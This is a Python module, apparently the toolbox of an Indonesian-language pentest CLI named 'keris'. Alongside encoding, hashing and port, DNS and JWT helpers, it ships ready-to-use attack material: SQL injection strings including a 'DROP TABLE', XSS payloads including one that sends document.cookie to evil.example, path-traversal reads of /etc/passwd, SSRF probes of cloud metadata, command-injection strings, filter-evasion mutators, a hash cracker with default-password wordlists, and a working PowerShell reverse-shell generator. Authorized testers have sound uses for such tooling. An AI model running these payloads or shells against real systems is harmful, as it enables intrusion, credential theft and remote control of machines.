"""Toolbox: kumpulan utilitas pentest (encode/decode, hash, payload, wordlist,
ports, dns, jwt). Semua murni lokal/stdlib — tidak ada request ke target.

Dipakai oleh subcommand `keris toolbox <tool> ...`.
"""

import base64
import hashlib
import hmac
import itertools
import json
import socket
import sys
import zlib
from typing import Any, Dict, List, Optional
from urllib.parse import quote, unquote, unquote_plus

# ---------------------------------------------------------------------------
# encode / decode
# ---------------------------------------------------------------------------

ENCODINGS = ("base64", "url", "hex", "html", "unicode", "rot13")


def encode_text(text: str, enc: str = "base64") -> str:
    enc = enc.lower()
    if enc == "base64":
        return base64.b64encode(text.encode("utf-8")).decode("ascii")
    if enc == "url":
        return quote(text, safe="")
    if enc == "hex":
        return text.encode("utf-8").hex()
    if enc == "html":
        return "".join(f"&#{ord(c)};" for c in text)
    if enc == "unicode":
        return "".join(f"\\u{ord(c):04x}" for c in text)
    if enc == "rot13":
        return text.translate(str.maketrans(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
            "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))
    raise ValueError(f"encoding tak dikenal: {enc}")


def decode_text(text: str, enc: str = "base64") -> str:
    enc = enc.lower()
    if enc == "base64":
        try:
            return base64.b64decode(text.encode("ascii")).decode("utf-8", "replace")
        except Exception as e:
            return f"(gagal decode base64: {e})"
    if enc == "url":
        return unquote(text)
    if enc == "urlplus":
        return unquote_plus(text)
    if enc == "hex":
        try:
            return bytes.fromhex(text).decode("utf-8", "replace")
        except Exception as e:
            return f"(gagal decode hex: {e})"
    if enc == "html":
        import html as _html
        return _html.unescape(text)
    if enc == "unicode":
        try:
            return text.encode("utf-8").decode("unicode_escape")
        except Exception as e:
            return f"(gagal decode unicode: {e})"
    if enc == "rot13":
        return encode_text(text, "rot13")
    raise ValueError(f"encoding tak dikenal: {enc}")


# ---------------------------------------------------------------------------
# hash
# ---------------------------------------------------------------------------

HASH_ALGOS = ("md5", "sha1", "sha224", "sha256", "sha384", "sha512",
              "sha3_256", "sha3_512")


def hash_text(text: str, algo: str = "sha256") -> str:
    algo = algo.lower()
    if algo not in HASH_ALGOS:
        raise ValueError(f"algoritma hash tak dikenal: {algo}")
    h = hashlib.new(algo)
    h.update(text.encode("utf-8"))
    return h.hexdigest()


def hash_candidates(text: str) -> Dict[str, str]:
    return {a: hash_text(text, a) for a in HASH_ALGOS}


def crack_lookup(hashes: Dict[str, str], wordlist: List[str]) -> List[Dict[str, str]]:
    """Cari plaintext untuk beberapa hash (brute kamus lokal)."""
    found = []
    targets = {a.lower(): v.lower() for a, v in (hashes or {}).items()}
    for word in wordlist:
        for algo, h in targets.items():
            if hash_text(word, algo) == h:
                found.append({"algo": algo, "hash": h, "plaintext": word})
                break
    return found


# ---------------------------------------------------------------------------
# payload generation
# ---------------------------------------------------------------------------

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' AND SLEEP(5)--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "' OR 'a'='a'",
    "\" OR \"1\"=\"1",
    "') OR ('1'='1",
    "1; DROP TABLE users--",
    "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "'/**/OR/**/1=1--",
    "'%20OR%201=1--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><script>alert(1)</script>",
    "'><svg/onload=alert(1)>",
    "<svg onload=alert(document.domain)>",
    "javascript:alert(1)",
    "\" onmouseover=alert(1) x=\"",
    "<iframe src=javascript:alert(1)>",
    "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "'-alert(1)-'",
    "{{constructor.constructor('alert(1)')()}}",  # Vue/Angular template
    "${alert(1)}",
    "<script>fetch('https://evil.example/steal?c='+document.cookie)</script>",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc/passwd",
    "%252e%252e%252fetc%252fpasswd",
    "/etc/passwd%00",
    "....//....//....//etc/passwd",
    "..%c0%af..%c0%afetc/passwd",
    "file:///etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://127.0.0.1:22/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://169.254.169.254/latest/meta-data/",  # cloud metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://10.0.0.1/",
    "http://192.168.0.1/",
    "http://2130706433/",  # 127.0.0.1 desimal
    "http://0177.0.0.1/",
    "http://0x7f000001/",
]

COMMAND_PAYLOADS = [
    "id",
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "id && whoami",
    "id | base64",
    "ping -c 1 127.0.0.1",
    "cat /etc/passwd",
    "echo keris_rce",
]


def payload_group(name: str) -> List[str]:
    name = name.lower().replace("-", "")
    groups = {
        "sqli": SQLI_PAYLOADS,
        "sql": SQLI_PAYLOADS,
        "xss": XSS_PAYLOADS,
        "lfi": LFI_PAYLOADS,
        "path": LFI_PAYLOADS,
        "ssrf": SSRF_PAYLOADS,
        "cmd": COMMAND_PAYLOADS,
        "command": COMMAND_PAYLOADS,
        "rce": COMMAND_PAYLOADS,
    }
    if name not in groups:
        raise ValueError(
            "kelompok payload tak dikenal. Pilih: " + ", ".join(sorted(groups)))
    return groups[name]


def payload_mutation(payload: str, mutations: List[str]) -> List[str]:
    """Bangun varian payload dari daftar wrapper (encoding, casing, comment)."""
    out = [payload]
    for m in mutations:
        m = m.lower()
        if m == "upper":
            out.append(payload.upper())
        elif m == "lower":
            out.append(payload.lower())
        elif m == "url":
            out.append(quote(payload, safe=""))
        elif m == "double_url":
            out.append(quote(quote(payload, safe=""), safe=""))
        elif m == "b64":
            out.append(base64.b64encode(payload.encode()).decode())
        elif m == "hex":
            out.append(payload.encode().hex())
        elif m == "space_comment":
            out.append(payload.replace(" ", "/**/"))
        elif m == "null":
            out.append(payload + "\x00")
        elif m == "tab":
            out.append(payload.replace(" ", "\t"))
    return list(dict.fromkeys(out))


def reverse_shell(lang: str, lhost: str, lport: int) -> str:
    """Generator payload reverse shell (sama seperti modul shell)."""
    from keris.modules.shell import bash_reverse_shell, python_reverse_shell
    lang = lang.lower()
    if lang in ("bash", "sh", "nc", "netcat"):
        return bash_reverse_shell(lhost, lport)
    if lang in ("python", "py", "python3"):
        return python_reverse_shell(lhost, lport)
    if lang in ("powershell", "ps", "pwsh"):
        return powershell_reverse_shell(lhost, lport)
    raise ValueError("bahasa tak dikenal: pilih bash, python, atau powershell")


def powershell_reverse_shell(lhost: str, lport: int) -> str:
    return (
        "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient"
        f"('{lhost}',{lport});$s=$c.GetStream();"
        "[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName"
        "System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String );$s.Write(([text.encoding]::ASCII.GetBytes"
        "($r)),0,$r.Length)}}\""
    )


# ---------------------------------------------------------------------------
# wordlist
# ---------------------------------------------------------------------------

COMMON_USERNAMES = [
    "admin", "root", "administrator", "test", "user", "guest", "demo",
    "manager", "support", "webmaster", "superadmin", "operator", "backup",
    "dev", "sysadmin", "info", "postmaster", "helpdesk", "service", "qa",
]

COMMON_PASSWORDS = [
    "admin", "password", "123456", "12345678", "1234", "12345", "qwerty",
    "letmein", "admin123", "root", "toor", "password1", "passw0rd", "secret",
    "welcome", "monkey", "dragon", "football", "master", "admin@123",
    "P@ssw0rd", "Passw0rd!", "changeme", "default", "test123", "abc123",
]

SERVICE_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP",
    110: "POP3", 111: "RPC", 135: "MSRPC", 139: "NetBIOS", 143: "IMAP",
    443: "HTTPS", 445: "SMB", 465: "SMTPS", 993: "IMAPS", 995: "POP3S",
    1433: "MSSQL", 1521: "Oracle", 2049: "NFS", 2375: "Docker", 3000: "Grafana/Dev",
    3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 5984: "CouchDB",
    6379: "Redis", 6443: "K8s API", 8000: "HTTP-Alt", 8080: "HTTP-Proxy",
    8081: "HTTP-Alt", 8443: "HTTPS-Alt", 8888: "HTTP-Alt", 9000: "App",
    9090: "Prometheus", 9200: "Elasticsearch", 9300: "ES-Transport",
    11211: "Memcached", 15672: "RabbitMQ", 27017: "MongoDB",
}


def wordlist_passwords(seed: str = "") -> List[str]:
    """Bangun wordlist password: common + varian seed."""
    words = list(COMMON_PASSWORDS)
    if seed:
        base = seed.strip().lower()
        words.append(base)
        words.append(base.capitalize())
        words.append(base.upper())
        words.append(base + "123")
        words.append(base + "123!")
        words.append(base + "@123")
        words.append("!" + base)
        words.append(base + "2024")
        words.append(base + "2025")
        words.append(base + "2026")
        for n in (1, 2, 10, 11, 12, 100, 123):
            words.append(f"{base}{n}")
    return list(dict.fromkeys(words))


def wordlist_usernames(seed: str = "") -> List[str]:
    words = list(COMMON_USERNAMES)
    if seed:
        base = seed.strip().lower()
        words.append(base)
        words.append(base + "1")
        words.append(base + "123")
        words.append("admin" + base)
        words.append(base + "admin")
    return list(dict.fromkeys(words))


def wordlist_permute(chars: str, min_len: int, max_len: int,
                     cap: int = 10000) -> List[str]:
    """Hasilkan kombinasi karakter (brute token pendek)."""
    out = []
    for n in range(max(1, min_len), min(max_len, 6) + 1):
        for combo in itertools.product(chars, repeat=n):
            out.append("".join(combo))
            if len(out) >= cap:
                return out
    return out


# ---------------------------------------------------------------------------
# ports
# ---------------------------------------------------------------------------

def port_service(port: int) -> str:
    return SERVICE_PORTS.get(port, "unknown")


def common_ports() -> List[int]:
    from keris.modules.portscan import COMMON_PORTS
    return list(COMMON_PORTS)


def scan_ports(host: str, ports: Optional[List[int]] = None,
               workers: int = 20, timeout: float = 2.0) -> List[int]:
    from keris.modules.portscan import scan_ports as _scan
    return _scan(host, ports=ports, workers=workers, timeout=timeout)


# ---------------------------------------------------------------------------
# dns
# ---------------------------------------------------------------------------

def dns_lookup(domain: str) -> Dict[str, List[str]]:
    from keris.modules.dnscheck import check_dns
    return check_dns(domain)


# ---------------------------------------------------------------------------
# jwt
# ---------------------------------------------------------------------------

def jwt_decode(token: str) -> Dict[str, Any]:
    from keris.modules.jwt import decode_jwt
    return decode_jwt(token) or {}


def jwt_analyze(token: str) -> List[Dict[str, Any]]:
    from keris.modules.jwt import analyze_jwt
    return [f.to_dict() if hasattr(f, "to_dict") else vars(f)
            for f in analyze_jwt(token)]


# ---------------------------------------------------------------------------
# gzip/zlib helpers
# ---------------------------------------------------------------------------

def gzip_encode(text: str) -> str:
    import gzip
    return base64.b64encode(gzip.compress(text.encode("utf-8"))).decode("ascii")


def gzip_decode(text: str) -> str:
    import gzip
    return gzip.decompress(base64.b64decode(text.encode("ascii"))).decode("utf-8", "replace")


def zlib_encode(text: str) -> str:
    return base64.b64encode(zlib.compress(text.encode("utf-8"))).decode("ascii")


def zlib_decode(text: str) -> str:
    return zlib.decompress(base64.b64decode(text.encode("ascii"))).decode("utf-8", "replace")


TOOLS = {
    "encode": {"desc": "encode teks (base64,url,hex,html,unicode,rot13)",
               "func": lambda args: encode_text(args.value, getattr(args, "enc", "base64"))},
    "decode": {"desc": "decode teks (base64,url,hex,html,unicode,rot13)",
               "func": lambda args: decode_text(args.value, getattr(args, "enc", "base64"))},
    "hash": {"desc": "hitung hash (md5,sha1,sha256,...)", "func": hash_candidates},
    "crack": {"desc": "cari plaintext hash dari wordlist", "func": lambda args: crack_lookup(
        {"sha256": args.value}, wordlist_passwords(args.word))},
    "payload": {"desc": "daftar payload (sqli,xss,lfi,ssrf,cmd)",
                "func": lambda args: payload_group(args.value)},
    "mutate": {"desc": "mutasi payload (upper,url,b64,hex,space_comment,double_url,null,tab)",
               "func": lambda args: payload_mutation(args.value, getattr(args, "mutation", ["url"]))},
    "shell": {"desc": "generate reverse shell (bash,python,powershell)",
              "func": lambda args: reverse_shell(args.value, args.lhost, args.lport)},
    "wordlist": {"desc": "generate wordlist (password,username,permute)",
                 "func": lambda args: wordlist_usernames(args.value) if args.value else wordlist_passwords()},
    "ports": {"desc": "scan port umum target host", "func": lambda args: scan_ports(args.value)},
    "dns": {"desc": "cek record DNS + email security target", "func": lambda args: dns_lookup(args.value)},
    "jwt": {"desc": "decode token JWT", "func": lambda args: jwt_decode(args.value)},
    "jwt-analyze": {"desc": "analisis keamanan token JWT", "func": lambda args: jwt_analyze(args.value)},
    "gzip": {"desc": "kompres teks jadi gzip+base64", "func": lambda args: gzip_encode(args.value)},
    "gunzip": {"desc": "dekompres gzip+base64", "func": lambda args: gzip_decode(args.value)},
    "list": {"desc": "daftar semua tool", "func": lambda args: list_tools()},
}


def list_tools() -> Dict[str, str]:
    return {k: v["desc"] for k, v in sorted(TOOLS.items())}